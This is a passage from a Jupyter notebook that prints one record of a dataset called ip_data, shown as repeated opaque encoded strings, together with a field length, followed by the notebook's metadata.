'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA']]\n",
      "87\n"
     ]
    }
   ],
   "source": [
    "n = 626\n",
    "for i in range(n,n+1):\n",
    "    print(ip_data[i])\n",
    "    print(len(ip_data[i][6]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
